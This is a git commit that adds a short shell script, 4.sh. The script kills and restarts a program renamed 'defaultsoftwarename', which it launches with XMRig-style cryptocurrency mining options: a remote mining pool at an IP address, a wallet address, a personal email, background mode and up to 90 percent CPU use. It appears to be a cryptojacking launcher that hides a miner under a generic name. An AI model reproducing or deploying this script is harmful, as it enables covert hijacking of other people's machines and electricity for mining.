45c6623d4b6bbed56628dc773448005f7c812fc7
soomtom <51830714+soomtom@users.noreply.github.com>
2019-06-14 16:41:04 +0000

    Add files via upload

---
+++ 4.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 81.22.45.66:53791 -u 49VzQ2Mm3jHJtF4YQ5skauFyXc5uHTdL4evGQMd5xw2k2DXbauR5yg7XMeCUanKkfChsQk4bWuMKxf25o3Sfk5UVJFzEoT2 --pass=x:perezluis569@yahoo.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=90 --av=1 --variant -1
